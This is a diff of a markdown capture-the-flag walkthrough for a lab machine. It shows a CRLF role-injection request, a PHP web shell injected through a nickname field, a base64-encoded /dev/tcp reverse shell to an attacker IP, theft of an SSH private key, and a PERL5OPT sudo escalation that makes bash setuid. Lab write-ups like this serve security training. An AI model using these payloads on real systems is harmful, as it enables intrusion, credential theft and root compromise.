@@ -39,65 +39,83 @@ Copy those files to our workspace
 - We found some php files looking around (save.php) theres an admin role, we go to http service and register as a user.
 - We register burp suite to check request and responses and sent a request changing the role. using CRLF vulnerability
 <br/><br/>
+
 ```bash
 &role%0a=Admin
 ```
+
 <br/><br/>
 - Log out and log in again
 - We can export some results and change the extension with burp suite for excecute commands in php
 - There’s a vulnerable parameter called nickname
 <br/><br/>
+
 ```bash
 &nickname=<%3fphp+system($_GET['CMD'])+%3f>)
 ```
+
 <br/><br/>
 Once inside of php file we use
 <br/><br/>
+
 ```bash
 <file_name>.php?cmd=cat/etc/passwd
 ```
+
 <br/><br/>
 A user called jack in the machine
 <br/><br/>
 We are ready to be data
 <br/><br/>
+
 ```bash
 echo "sh -i >& /dev/tcp/<your_ip>/9001 0>&1" | base64
 ```
+
 <br/><br/>
+
 ```bash
 echo%20%22c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQ3LzkwMDEgMD4mMQo=%22%20|%20base64%20-d%20|%20bash
 ```
+
 <br/><br/>
 Estabilize using python
 <br/><br/>
+
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm
 ctrl + z
 stty raw -echo; fg
 ```
+
 <br/><br/>
 There is a PKI we can see it executing
 <br/><br/>
+
 ```bash
 ./execute_query 5 ../.ssh/id_rsa
 ```
+
 <br/><br/>
 This key has a problem with the format, just change the format and use
 <br/><br/>
+
 ```bash
 chmod 600 id_rsa 
 sudo ssh -i id_rsa jack@10.10.11.232
 ```
+
 <br/><br/>
 ![Untitled]({{ '/assets/images/f4be24e3-b650-4fa0-8967-50ac927aaa38-export-270ef6e6-110b-4fd7-b57c-8d927e335c2c/f4be24e3-b650-4fa0-8967-50ac927aaa38-export-270ef6e6-110b-4fd7-b57c-8d927e335c2c_Untitled.png' | relative_url }})
 <br/><br/>
 ## 3: Priv esc
 <br/><br/>
+
 ```bash
 sudo -l
 ```
+
 <br/><br/>
 ![Untitled]({{ '/assets/images/f4be24e3-b650-4fa0-8967-50ac927aaa38-export-270ef6e6-110b-4fd7-b57c-8d927e335c2c/f4be24e3-b650-4fa0-8967-50ac927aaa38-export-270ef6e6-110b-4fd7-b57c-8d927e335c2c_Untitled_1.png' | relative_url }})
 <br/><br/>
@@ -109,10 +127,12 @@ This vulnerability is called as “perl_startup” Privilege Escalation.
 <br/><br/>
 That enabled me to execute scripts with root privileges, as I had the ability to configure the environment while running Perl.
 <br/><br/>
+
 ```bash
 sudo PERL5OPT=-d PERL5DB='exec "chmod u+s /bin/bash"' /opt/monitor.sh
 bash -p
 ```
+
 <br/><br/>
 Machine pwned!!!!
 
